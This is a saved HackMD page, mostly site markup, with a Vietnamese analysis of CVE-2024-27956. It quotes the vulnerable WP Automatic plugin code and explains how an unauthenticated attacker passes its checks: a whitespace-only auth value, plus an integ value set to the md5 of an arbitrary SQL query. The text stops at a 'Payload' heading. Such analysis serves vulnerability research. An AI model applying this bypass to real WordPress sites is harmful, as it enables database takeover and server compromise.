class="ph ph-paint-brush text-normal leading-[14px]"></i></button><a href="https://hackmd.io/?utm_source=view-page&amp;utm_medium=logo-nav" class="ui-pretty-logo-home flex whitespace-nowrap text-right font-brand-headline text-lg font-bold text-icon-emphasize hocus:text-text-default hocus:no-underline"><span class="flex items-center justify-center">Try  <img class="h-6 w-auto" src="./Phân tích CVE-2024-27956 - HackMD_files/Logo.svg"> HackMD</span></a></span></div></div><div class="ui-infobar container-fluid unselectable hidden-print comment-enabled"><div class="row"><div class="col-xs-12 ui-infobar-inner flex items-start"><div class="ui-infobar__user-info"><ul class="list-inline mb-0 w-full"><li class="w-full"><div class="flex w-full gap-[9px] text-4"><span class="mt-[7px] flex justify-center ui-owner" data-profile="cheese00"> <a class="ui-user-icon m-0 inline-block h-[28px] w-[28px] user-card-popover" target="_blank" href="https://hackmd.io/@cheese00" data-toggle="popover" style="background-image: url(&quot;https://lh3.googleusercontent.com/a/AEdFTp75QFCKqWg1h3OfyDxwp8XpZM01izYsx18ZvSqm=s96-c&quot;);" data-original-title="" title=""></a></span><div class="flex w-[calc(100%-32px)] min-w-0 flex-col items-start"><div class="w-auto max-w-full break-words"><a class="text-normal font-semibold leading-normal text-text-emphasize hocus:text-link-text-hover hocus:underline ui-owner user-card-popover" data-profile="cheese00" href="https://hackmd.io/@cheese00" data-toggle="popover" data-original-title="" title="">Chi Lam</a><div class="follow-button-container inline" data-signin="false"><span class="mx-1"><span class="mr-1">·</span><button class="bg-transparent border-none p-0 font-semibold text-text-subtle ui-signin">Follow</button></span></div></div><div class="flex w-full text-text-subtle [&amp;_a]:text-text-subtle [&amp;_a]:hover:text-text-subtle"><div class="w-auto max-w-full break-words"><span class="ui-status-lastchange [&amp;_a]:text-link-text-default [&amp;_a]:hocus:text-link-text-hover">Last edited by <a class="user user-card-popover" href="https://hackmd.io/@cheese00" data-toggle="popover" data-original-title="" title="">Chi Lam</a> on <span title="Tue, May 7, 2024 1:50 PM">May 7, 2024</span></span><span class="ui-lastchange" data-createtime="1714380163821" data-updatetime="1715064644113"></span></div><span class="ui-more-info ml-1.5 inline-flex h-fit p-[1.5px]" data-toggle="popover" style="display: none;" data-original-title="" title=""><i class="h-fit text-[13px] leading-[13px] fa fa-github"></i><div class="more-info-raw hmd-dn"><span class="ui-connectedGithub note-status-row hmd-dn text-text-subtle [&amp;_a]:text-text-subtle [&amp;_a]:hover:text-text-subtle"><span class="flex flex-row gap-1.5"><i class="w-5 text-center text-[20px] leading-lg fa fa-github"></i><a class="ui-synced-text">Linked with GitHub</a></span></span></div></span><a class="ml-1.5 inline-flex h-fit p-[1.5px] text-icon-subtler hocus:no-underline hocus:outline-none" data-toggle="popover" data-placement="bottom" data-html="true" data-content="
            &lt;span class=&#39;flex gap-1.5 text-text-subtle&#39;&gt;
              &lt;i class=&#39;ph-fill ph-globe-hemisphere-west text-[20px] leading-lg&#39; aria-hidden=&#39;true&#39;&gt;&lt;/i&gt;
              &lt;span&gt;Published&lt;/span&gt;
            &lt;/span&gt;" data-trigger="focus" role="button" tabindex="0" data-original-title="" title=""><i class="ph-fill ph-globe-hemisphere-west text-[13px] leading-[13px]" aria-hidden="true"></i></a></div><div class="ui-contributor flex">Contributed by<div class="ml-2 flex items-center gap-1"><a href="https://hackmd.io/@cheese00"><div class="relative rounded-full avatar user-card-popover" data-toggle="popover" style="background-image: url(&quot;https://lh3.googleusercontent.com/a/AEdFTp75QFCKqWg1h3OfyDxwp8XpZM01izYsx18ZvSqm=s96-c&quot;); background-size: cover; width: 20px; height: 20px; min-width: 20px; min-height: 20px;" data-original-title="" title=""></div></a></div></div></div></div></li></ul></div><div class="hmd-text-right ui-infobar__actions items-center"><ul class="list-inline mb-0"><li class="!flex"><a class="community-button" title="" data-toggle="tooltip" data-placement="bottom" data-offset="0,5" type="button" href="https://hackmd.io/@cheese00/r1hYa0hZA#" data-original-title="Like"><i class="ph ph-heart"></i><span class="count"></span></a><a class="community-button" title="" data-toggle="tooltip" data-placement="bottom" data-offset="0,5" type="button" href="https://hackmd.io/@cheese00/r1hYa0hZA#" data-original-title="Bookmark"><i class="ph ph-bookmark-simple"></i></a><a class="community-button" href="https://hackmd.io/@cheese00/r1hYa0hZA#"><i class="ph ph-bell"></i></a></li></ul></div><div class="clearfix"></div></div></div><div class="ui-comment-app" id="hackmd-app" style="right: -64px; width: 64px;"><div id="comment-app"><div class="open-comments open-comments-panel fixed z-[1049] !w-16"><div><button class="m-0 ui-open-comments flex h-[38px] items-center gap-1 p-2.5 bg-background-default text-normal leading-normal text-text-default rounded border border-solid border-border-default hover:bg-element-bg-hover hover:text-text-emphasize"><i class="ph ph-chat-circle-dots text-5 leading-sm" aria-hidden="true"></i><span class="text">0</span></button></div></div><div class="comments-scroller"><div class="ui-comment-parent-container comments-containers"></div></div></div></div></div><div class="ui-comment-app" style="right: -64px; width: 64px;"><div id="comments-panel-portal" style="display: none;"><div class="ui-comment-panel-root flex flex-row-reverse fixed select-text overflow-y-auto overflow-x-hidden transition-all duration-200 top-0 h-[100dvh] max-h-[100dvh] react-resizable" style="width: 348px;"><div class="flex h-full min-w-0 flex-grow flex-col overflow-auto bg-background-sunken"><div class="ui-comment-panel-navbar sticky top-0 z-10 box-border flex flex-col text-4 leading-[16px] border-0 border-b-1 border-solid border-b-border-default border-t-1 border-t-border-default"><div class="flex flex-row items-center justify-between gap-1 bg-background-subtler py-1 pl-2 pr-4"><button class="p-0 m-0 bg-transparent border-none w-[155px] min-w-0 rounded px-3 py-2.5 text-normal leading-normal text-text-default hocus:bg-element-bg-hover hocus:text-text-emphasize" type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-4" data-state="closed"><span class="flex flex-row items-center gap-1.5"><span class="flex min-w-0 flex-grow flex-row items-center gap-1.5"><i class="ph ph-chat-circle-dots text-lg leading-sm"></i><span class="min-w-0 flex-grow overflow-hidden overflow-ellipsis whitespace-nowrap text-left">Comments</span></span><i class="ph text-lg leading-sm ph-caret-down"></i></span></button><span class="flex flex-shrink-0 flex-row items-center gap-1.5 text-text-default"><button class="m-0 bg-transparent ui-comment-feedback p-1.5 text-sm leading-sm text-text-default rounded border border-solid border-border-default hocus:bg-element-bg-hover hocus:text-text-emphasize" data-tally-open="wo95EN" data-tally-emoji-text="👋" data-tally-emoji-animation="wave">Feedback</button><button class="rounded p-2.5 text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled" data-toggle="tooltip" data-original-title="Pin right panel"><i class="ph ph-push-pin" aria-hidden="true"></i></button><button class="m-0 bg-transparent border-none inline-flex cursor-pointer items-center justify-center p-1.5 text-[16px] leading-sm"><i class="ph ph-x" aria-hidden="true"></i></button></span></div><div class="flex flex-col gap-2.5 bg-background-primary-subtler p-4.5 border-0 border-t-1 border-solid border-border-default"><span class="text-sm font-semibold leading-sm text-text-emphasize">Log in to edit or delete your comments and be notified of replies.</span><div class="flex flex-row justify-between text-sm font-normal leading-sm [&amp;&gt;a]:text-link-text-default [&amp;&gt;a]:underline [&amp;&gt;a:hover]:text-link-text-hover [&amp;&gt;a:focus]:text-link-text-hover"><a href="https://hackmd.io/join?return=true" class="plausible-event-name=UserNoteCommentSignup">Sign up</a><a class="cursor-pointer">Already have an account? Log in</a></div></div></div><div class="mt-20 flex flex-col items-center gap-5 px-[58.5px] text-center"><span class="px-[30px] py-3"><img src="./Phân tích CVE-2024-27956 - HackMD_files/new-comment-placeholder-dark.svg"></span><span class="flex flex-col items-center gap-3"><span class="text-normal font-semibold leading-normal text-text-default">There is no comment</span><span class="text-sm leading-sm text-text-subtle">Select some text and then click Comment, or simply add a comment to this page from below to start a discussion.</span></span></div><div class="flex flex-col gap-2.5 p-2.5"></div><div class="flex-grow"></div><div class="ui-anchorless-comment-input-container sticky bottom-0 w-full border-0 border-solid bg-background-subtler rounded-t-md border-t-1 border-border-default p-4"><div class="flex w-full flex-col gap-2"><div class="ui-comment-input-container relative"><textarea class="invisible absolute w-full resize-none border border-solid p-3 text-normal leading-normal" rows="1" readonly=""></textarea><textarea class="!placeholder:text-text-subtler p-3 text-normal leading-normal text-text-default w-full resize-none rounded-[3px] border border-solid border-border-default bg-background-subtler focus-within:border-border-subtle focus-within:bg-background-default focus:outline-none hocus:border-border-subtle cursor-not-allowed" readonly="" placeholder="You do not have permission to add a comment. Please contact the owner to request access." rows="1" maxlength="1000"></textarea><div class="text-complete-container fixed [&amp;&gt;.dropdown-menu]:!absolute" style="top: 0px;"></div></div><div class="flex-row justify-end gap-1.5 hidden"><button class="rounded py-2 text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-border-default hocus:bg-element-bg-hover hocus:border-element-border-hover hocus:text-text-emphasize focus:shadow-[0_0_0_2px_#77777733] disabled:bg-element-bg-disabled disabled:border-element-border-disabled disabled:text-element-text-disabled disabled:hocus:bg-element-bg-disabled disabled:hocus:border-element-border-disabled disabled:hocus:text-element-text-disabled disabled:border disabled:border-solid disabled:hocus:border disabled:hocus:border-solid px-3.5" data-state="closed">Discard</button><button class="rounded text-normal font-normal leading-normal flex bg-background-primary-default text-white border border-solid border-background-primary-default hover:bg-background-primary-hover hover:border-background-primary-hover focus:bg-background-primary-focus focus:border-background-primary-focus focus:shadow-[0_0_0_2px_#453AFF33] disabled:bg-background-primary-disabled disabled:border-background-primary-disabled disabled:opacity-[0.65] px-[15px] py-[9px]" disabled="" data-state="closed">Send</button></div></div></div></div><span class="ui-right-panel-resize-handle relative cursor-ew-resize select-none pl-[5px] border-0 border-r-2 border-l-1 border-solid border-r-border-default border-l-transparent hocus:border-r-[3px] hocus:border-l-0 hocus:border-r-border-subtler"></span></div></div></div><div id="doc" class="container-fluid markdown-body comment-enabled" data-hard-breaks="true" lang="en-US"><div id="doc-body"><h1 class="part" data-startline="1" data-endline="1" id="Phân-tích-CVE-2024-27956" data-id="Phân-tích-CVE-2024-27956"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Ph%C3%A2n-t%C3%ADch-CVE-2024-27956" title="Phân-tích-CVE-2024-27956" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="2" data-size="24">Phân tích CVE-2024-27956</span></h1><p class="part" data-startline="3" data-endline="3" data-position="28" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="28" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/BkGjxeT-A.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="28" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><h2 class="part" data-startline="5" data-endline="5" id="Tóm-tắt" data-id="Tóm-tắt"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#T%C3%B3m-t%E1%BA%AFt" title="Tóm-tắt" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="83" data-size="7">Tóm tắt</span></h2><p class="part" data-startline="7" data-endline="7" data-position="92" data-size="0"><span data-position="92" data-size="267">Lỗ hổng này tồn tại trong plugin WP Automatic (premium version) được phát triển bởi ValvePress. Lỗ hổng này cho phép bất kỳ người dùng chưa được xác thực nào có thể kiểm soát hoàn toàn truy vấn SQL sẽ được thực thi trên trang web WordPress. Từ đó, kẻ tấn công có thể:</span></p><ul class="part" data-startline="8" data-endline="11" data-position="360" data-size="0">
<li class="" data-startline="8" data-endline="8" data-position="362" data-size="0"><span data-position="362" data-size="27">Tạo tài khoản quản trị viên</span></li>
<li class="" data-startline="9" data-endline="9" data-position="392" data-size="0"><span data-position="392" data-size="29">Tải lên Web Shell và Backdoor</span></li>
<li class="" data-startline="10" data-endline="11" data-position="424" data-size="0"><span data-position="424" data-size="36">Hoàn toàn kiểm soát được máy chủ web</span></li>
</ul><h2 class="part" data-startline="12" data-endline="12" id="Set-up-môi-trường-để-phân-tích" data-id="Set-up-môi-trường-để-phân-tích"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Set-up-m%C3%B4i-tr%C6%B0%E1%BB%9Dng-%C4%91%E1%BB%83-ph%C3%A2n-t%C3%ADch" title="Set-up-môi-trường-để-phân-tích" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="465" data-size="30">Set up môi trường để phân tích</span></h2><p class="part" data-startline="14" data-endline="14" data-position="497" data-size="0"><span data-position="497" data-size="47">Các công cụ thiết bị mình sử dụng để phân tích:</span></p><ul class="part" data-startline="16" data-endline="20" data-position="546" data-size="0">
<li class="" data-startline="16" data-endline="16" data-position="548" data-size="0"><span data-position="548" data-size="5">MacOS</span></li>
<li class="" data-startline="17" data-endline="17" data-position="556" data-size="0"><a href="https://wordpress.org/download/" target="_blank" rel="noopener"><span data-position="557" data-size="23">Wordpress version 6.5.2</span></a></li>
<li class="" data-startline="18" data-endline="18" data-position="617" data-size="0"><a href="https://www.apachefriends.org/" target="_blank" rel="noopener"><span data-position="618" data-size="11">XAMPP 8.2.4</span></a></li>
<li class="" data-startline="19" data-endline="20" data-position="665" data-size="0"><a href="https://github.com/truonghuuphuc/CVE-2024-27956/tree/main" target="_blank" rel="noopener"><span data-position="666" data-size="34">Plugin WP Automatic version 3.92.0</span></a><span data-position="760" data-size="59">, plugin này mình dùng ké của một bài phân tích trên github</span></li>
</ul><h2 class="part" data-startline="21" data-endline="21" id="Sink" data-id="Sink"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Sink" title="Sink" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="826" data-size="4">Sink</span></h2><p class="part" data-startline="23" data-endline="23" data-position="832" data-size="0"><span data-position="832" data-size="23">File code bị dính lỗi: </span><code data-position="856" data-size="11">inc/csv.php</code></p><p class="part" data-startline="25" data-endline="25" data-position="870" data-size="0"><span data-position="870" data-size="30">Trong đó đoạn code đáng chú ý:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="27" data-endline="50" data-infoprefix-length="4" data-position="902"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="php hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span>
<span data-linenumber="22"></span></div><div class="code"><span class="hljs-comment">// extract query</span>
<span class="hljs-variable">$q</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'q'</span>]);
<span class="hljs-variable">$auth</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'auth'</span>]);
<span class="hljs-variable">$integ</span>=stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'integ'</span>]);

<span class="hljs-keyword">if</span>(wp_automatic_trim(<span class="hljs-variable">$auth</span> == <span class="hljs-string">''</span>)){
	  <span class="hljs-keyword">echo</span> <span class="hljs-string">'login required'</span>;
	<span class="hljs-keyword">exit</span>;
}

<span class="hljs-keyword">if</span>(wp_automatic_trim(<span class="hljs-variable">$auth</span>) != wp_automatic_trim(<span class="hljs-variable">$current_user</span>-&gt;user_pass)){
	  <span class="hljs-keyword">echo</span> <span class="hljs-string">'invalid login'</span>;
	<span class="hljs-keyword">exit</span>;
}

<span class="hljs-keyword">if</span>(md5(wp_automatic_trim(<span class="hljs-variable">$q</span>.<span class="hljs-variable">$current_user</span>-&gt;user_pass)) != <span class="hljs-variable">$integ</span> ){
	  <span class="hljs-keyword">echo</span> <span class="hljs-string">'Tampered query'</span>;
	<span class="hljs-keyword">exit</span>;
}
 

<span class="hljs-variable">$rows</span>=<span class="hljs-variable">$wpdb</span>-&gt;get_results(<span class="hljs-variable">$q</span>);
</div></div></code></pre>
      </div><p class="part" data-startline="53" data-endline="53" data-position="1362" data-size="0"><span data-position="1362" data-size="15">Ta có thể thấy </span><code data-position="1378" data-size="29">$rows=$wpdb-&gt;get_results($q);</code><span data-position="1408" data-size="34"> sẽ thực thi câu query ở variable </span><code data-position="1443" data-size="2">$q</code></p><p class="part" data-startline="55" data-endline="55" data-position="1448" data-size="0"><span data-position="1448" data-size="12">Mà variable </span><code data-position="1461" data-size="2">$q</code><span data-position="1464" data-size="18"> chính là tham số </span><code data-position="1483" data-size="1">q</code><span data-position="1485" data-size="32"> được người dùng POST lên server</span></p><p class="part" data-startline="57" data-endline="57" data-position="1519" data-size="0"><span data-position="1519" data-size="3">=&gt; </span><strong data-position="1522" data-size="0"><span data-position="1524" data-size="63">Ta có thể gửi bất kỳ truy vấn SQL cho server thông qua tham số </span><code data-position="1588" data-size="1">q</code></strong></p><h2 class="part" data-startline="59" data-endline="59" id="Phân-tích" data-id="Phân-tích"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Ph%C3%A2n-t%C3%ADch" title="Phân-tích" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="1597" data-size="9">Phân tích</span></h2><p class="part" data-startline="61" data-endline="61" data-position="1608" data-size="0"><span data-position="1608" data-size="128">Tuy nhiên server có thực hiện một số kiểm tra xác thực người dùng trước khi thực thi truy vấn. Các bước kiểm tra sẽ đều qua hàm </span><code data-position="1737" data-size="17">wp_automatic_trim</code></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="63" data-endline="72" data-infoprefix-length="4" data-position="1757"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="php hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span></div><div class="code"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wp_automatic_trim</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)
</span>{
	<span class="hljs-keyword">if</span> (is_null(<span class="hljs-variable">$str</span>)) {
		<span class="hljs-keyword">return</span> <span class="hljs-string">''</span>;
	} <span class="hljs-keyword">else</span> {
		<span class="hljs-keyword">return</span> trim(<span class="hljs-variable">$str</span>);
	}
}
</div></div></code></pre>
      </div><p class="part" data-startline="73" data-endline="73" data-position="1875" data-size="0"><span data-position="1875" data-size="9">Trong đó </span><code data-position="1885" data-size="6">trim()</code><span data-position="1892" data-size="41"> sẽ giúp xoá các ký tự trắng dư thừa như:</span></p><ul class="part" data-startline="74" data-endline="77" data-position="1934" data-size="0">
<li class="" data-startline="74" data-endline="74" data-position="1936" data-size="0"><span data-position="1936" data-size="21">Ký tự trắng đầu chuỗi</span></li>
<li class="" data-startline="75" data-endline="75" data-position="1960" data-size="0"><span data-position="1960" data-size="22">Ký tự trắng cuối chuỗi</span></li>
<li class="" data-startline="76" data-endline="77" data-position="1985" data-size="0"><span data-position="1985" data-size="57">Nhiều ký tự trắng gần nhau được lược bỏ còn 1 ký tự trắng</span></li>
</ul><p class="part" data-startline="78" data-endline="78" data-position="2044" data-size="0"><span data-position="2044" data-size="48">Sau khi được trim, các variable sẽ được kiểm tra</span></p><p class="part" data-startline="80" data-endline="80" data-position="2094" data-size="0"><strong data-position="2094" data-size="0"><code data-position="2097" data-size="5">$auth</code><span data-position="2103" data-size="6"> check</span></strong></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="82" data-endline="84" data-infoprefix-length="4" data-position="2113"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="wrap php hljs">wp_automatic_trim(<span class="hljs-variable">$auth</span>) != wp_automatic_trim(<span class="hljs-variable">$current_user</span>-&gt;user_pass)
</code></pre>
      </div><p class="part" data-startline="86" data-endline="86" data-position="2198" data-size="0"><span data-position="2198" data-size="96">Nhưng vì tập tin được truy cập bởi một người dùng chưa được xác thực (unauthenticated user) nên </span><code data-position="2295" data-size="43">wp_automatic_trim($current_user-&gt;user_pass)</code><span data-position="2339" data-size="9"> sẽ bằng </span><code data-position="2349" data-size="2">''</code><span data-position="2352" data-size="1">.</span></p><p class="part" data-startline="88" data-endline="88" data-position="2356" data-size="0"><span data-position="2356" data-size="34">Như vậy ta chỉ cần để giá trị của </span><code data-position="2391" data-size="5">$auth</code><span data-position="2397" data-size="18"> là một chuỗi rỗng</span></p><p class="part" data-startline="90" data-endline="90" data-position="2417" data-size="0"><strong data-position="2417" data-size="0"><code data-position="2420" data-size="7">$insteg</code><span data-position="2428" data-size="6"> check</span></strong></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="91" data-endline="93" data-infoprefix-length="4" data-position="2437"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="wrap php hljs">md5(wp_automatic_trim(<span class="hljs-variable">$q</span>.<span class="hljs-variable">$current_user</span>-&gt;user_pass)) != <span class="hljs-variable">$integ</span>
</code></pre>
      </div><p class="part" data-startline="95" data-endline="95" data-position="2512" data-size="0"><code data-position="2513" data-size="24">$current_user-&gt;user_pass</code><span data-position="2538" data-size="37"> là chuỗi rỗng nên đây sẽ là so sánh </span><code data-position="2576" data-size="7">md5($q)</code><span data-position="2584" data-size="5"> với </span><code data-position="2590" data-size="6">$integ</code></p><p class="part" data-startline="97" data-endline="97" data-position="2600" data-size="0"><span data-position="2600" data-size="34">Như vậy ta chỉ cần để giá trị của </span><code data-position="2635" data-size="6">$integ</code><span data-position="2642" data-size="24"> là md5 của câu truy vấn</span></p><p class="part" data-startline="99" data-endline="100" data-position="2668" data-size="0"><strong data-position="2668" data-size="0"><span data-position="2670" data-size="13">Empty string </span><code data-position="2684" data-size="5">$auth</code><span data-position="2690" data-size="6"> check</span></strong><br>
<span data-position="2699" data-size="19">Tuy nhiên trước đó </span><code data-position="2719" data-size="5">$auth</code><span data-position="2725" data-size="81"> sẽ được check xem có phải là chuỗi rỗng hay không. Để bypass được ta chỉ cần để </span><code data-position="2807" data-size="5">$auth</code><span data-position="2813" data-size="21"> là một khoảng trắng </span><code data-position="2835" data-size="3">%20</code><span data-position="2839" data-size="5"> hay </span><code data-position="2845" data-size="3">%00</code></p><p class="part" data-startline="102" data-endline="102" data-position="2851" data-size="0"><span data-position="2851" data-size="26">Sau đó khi được check với </span><code data-position="2878" data-size="24">$current_user-&gt;user_pass</code><span data-position="2903" data-size="24"> thì khoảng trắng trong </span><code data-position="2928" data-size="5">$auth</code><span data-position="2934" data-size="28"> sẽ được lược bỏ đi nhờ hàm </span><code data-position="2963" data-size="6">trim()</code></p><h2 class="part" data-startline="104" data-endline="104" id="Payload" data-id="Payload"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Payload" title="Payload" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="2975" 